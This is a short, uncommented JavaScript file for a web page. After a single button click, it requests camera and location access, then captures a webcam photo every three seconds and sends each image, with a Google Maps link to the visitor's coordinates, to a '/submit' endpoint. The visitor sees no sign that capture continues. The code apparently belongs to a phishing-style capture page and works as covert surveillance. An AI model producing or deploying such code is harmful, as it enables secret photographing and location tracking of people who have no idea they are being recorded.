document.getElementById('requestPermission').addEventListener('click', async () => {
    const status = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // Request Camera
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    // Request Location
    navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;

        // Capture photo every 3 seconds
        setInterval(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(async (blob) => {
                const reader = new FileReader();
                reader.onload = () => {
                    fetch('/submit', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: new URLSearchParams({
                            location: gmaps,
                            image: reader.result
                        })
                    });
                };
                reader.readAsDataURL(blob);
            }, 'image/png');
        }, 3000);
    }, (err) => {
        status.innerText = "Location denied.";
    });
});
